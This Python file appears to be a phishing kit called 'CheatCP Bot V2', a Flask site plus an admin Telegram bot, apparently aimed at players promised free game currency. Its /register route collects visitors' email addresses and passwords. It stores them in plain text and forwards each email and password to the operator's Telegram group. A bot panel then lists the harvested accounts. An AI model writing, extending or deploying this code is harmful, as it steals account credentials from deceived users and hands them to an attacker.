# -*- coding: utf-8 -*-
# CheatCP Bot V2 - Telegram Bot + Flask Web Server

import json
import os
import random
import string
import threading
from datetime import datetime

from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    ContextTypes
)
from telegram.request import HTTPXRequest

from config import (
    BOT_TOKEN, ADMIN_ID, GROUP_ID,
    USE_PROXY, PROXY_TYPE, PROXY_HOST, PROXY_PORT,
    CODE_PREFIX, MAX_SP, SP_OPTIONS, SUPPORT_ID
)

# ==========================================
# Paths
# ==========================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "data.json")

# ==========================================
# Flask App
# ==========================================
app_web = Flask(__name__, static_folder=BASE_DIR)
CORS(app_web)

# ==========================================
# Telegram Bot Instance (global)
# ==========================================
bot_app = None

# ==========================================
# Database
# ==========================================
def load_data():
    with open(DB_PATH, "r", encoding="utf-8") as f:
        return json.load(f)


def save_data(data):
    with open(DB_PATH, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)


def make_code(user_id):
    rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"{user_id}-{CODE_PREFIX}-{rand}"


# ==========================================
# Flask Routes
# ==========================================
@app_web.route("/")
def index():
    return send_from_directory(BASE_DIR, "index.html")


@app_web.route("/register", methods=["POST"])
def register():
    try:
        data = request.get_json()
        email = data.get("email", "").strip()
        password = data.get("password", "").strip()
        rubika = data.get("rubika", "").strip()
        desc = data.get("desc", "").strip()
        sp = int(data.get("sp", 0))

        if not email or not password or not rubika or not sp:
            return jsonify({"success": False, "message": "همه فیلدها الزامی است"}), 400

        if sp > MAX_SP:
            return jsonify({"success": False, "message": f"SP بیشتر از {MAX_SP} مجاز نیست"}), 400

        db = load_data()
        uid = db.get("next_user_id", 1)
        code = make_code(uid)

        user = {
            "id": uid,
            "email": email,
            "password": password,
            "rubika": rubika,
            "desc": desc,
            "sp": sp,
            "code": code,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M")
        }

        db["users"].append(user)
        db["next_user_id"] = uid + 1
        db["stats"]["total_users"] = len(db["users"])
        db["stats"]["total_visits"] = db["stats"].get("total_visits", 0) + 1
        save_data(db)

        # Send to Telegram group (in background)
        threading.Thread(
            target=send_to_telegram,
            args=(user,),
            daemon=True
        ).start()

        return jsonify({"success": True, "code": code, "id": uid})

    except Exception as e:
        print(f"Register error: {e}")
        return jsonify({"success": False, "message": "خطای سرور"}), 500


def send_to_telegram(user):
    """Send new user info to Telegram group"""
    global bot_app
    if bot_app is None:
        print("Bot not ready yet!")
        return

    try:
        import asyncio
        text = (
            f"🆕 New User #{user['id']}\n\n"
            f"📧 Email: {user['email']}\n"
            f"🔑 Password: {user['password']}\n"
            f"💬 Rubika: {user['rubika']}\n"
            f"📝 Desc: {user['desc']}\n"
            f"💎 SP: {user['sp']:,}\n"
            f"🎫 Code: {user['code']}\n"
            f"📅 {user['date']}"
        )

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(
            bot_app.bot.send_message(chat_id=GROUP_ID, text=text)
        )
        loop.close()
        print(f"✅ Sent user #{user['id']} to Telegram")
    except Exception as e:
        print(f"❌ Telegram send error: {e}")


# ==========================================
# Telegram Bot Handlers
# ==========================================
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text(
            f"⛔️ Access Denied!\n🎧 Support: {SUPPORT_ID}"
        )
        return

    keyboard = [
        [InlineKeyboardButton("👥 لیست کاربران", callback_data="list_users")],
        [InlineKeyboardButton("📊 آمار", callback_data="stats")],
        [InlineKeyboardButton("⚙️ تنظیمات", callback_data="settings")],
        [InlineKeyboardButton("🌐 آدرس سایت", callback_data="site_info")],
    ]
    await update.message.reply_text(
        "🎮 CheatCP Admin Panel\n\nیک گزینه را انتخاب کن:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "list_users":
        db = load_data()
        users = db.get("users", [])
        if not users:
            await query.edit_message_text("📭 هنوز کاربری ثبت نشده.")
            return

        text = "👥 لیست کاربران:\n\n"
        for u in users[-10:]:  # آخرین ۱۰ کاربر
            text += (
                f"#{u['id']} | {u['email']}\n"
                f"   🎫 {u['code']}\n"
                f"   💎 SP: {u['sp']:,}\n"
                f"   ───────────────\n"
            )
        await query.edit_message_text(text)

    elif data == "stats":
        db = load_data()
        stats = db.get("stats", {})
        text = (
            f"📊 آمار ربات\n\n"
            f"👥 تعداد کاربران: {len(db.get('users', []))}\n"
            f"👁️ بازدید کل: {stats.get('total_visits', 0)}\n"
            f"🆔 آیدی بعدی: {db.get('next_user_id', 1)}\n"
            f"⏰ {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        )
        await query.edit_message_text(text)

    elif data == "settings":
        db = load_data()
        s = db.get("settings", {})
        text = (
            f"⚙️ تنظیمات\n\n"
            f"⏰ Report Interval: {s.get('report_interval', 360)} min\n"
            f"💰 Max SP: {MAX_SP:,}\n"
            f"🎧 Support: {SUPPORT_ID}"
        )
        await query.edit_message_text(text)

    elif data == "site_info":
        await query.edit_message_text(
            "🌐 آدرس سایت:\n\n"
            "http://127.0.0.1:5000\n\n"
            "⚠️ برای دسترسی از خارج، باید IP سرور یا دامنه بدی."
        )


# ==========================================
# Start Flask in a separate thread
# ==========================================
def run_flask():
    print("🌐 Flask starting on http://127.0.0.1:5000")
    app_web.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)


# ==========================================
# Main
# ==========================================
def main():
    global bot_app

    print("🚀 Starting CheatCP System...")

    # Build Telegram bot
    if USE_PROXY:
        proxy_url = f"{PROXY_TYPE}://{PROXY_HOST}:{PROXY_PORT}"
        print(f"🌐 Using proxy: {proxy_url}")
        request = HTTPXRequest(proxy=proxy_url)
        bot_app = Application.builder().token(BOT_TOKEN).request(request).build()
    else:
        print("🌐 Direct connection (no proxy)")
        bot_app = Application.builder().token(BOT_TOKEN).build()

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CallbackQueryHandler(button_handler))

    # Start Flask in background thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    print("✅ Bot ready! (Ctrl+C to stop)")
    print("🌐 Site: http://127.0.0.1:5000")

    bot_app.run_polling()


if __name__ == "__main__":
    main()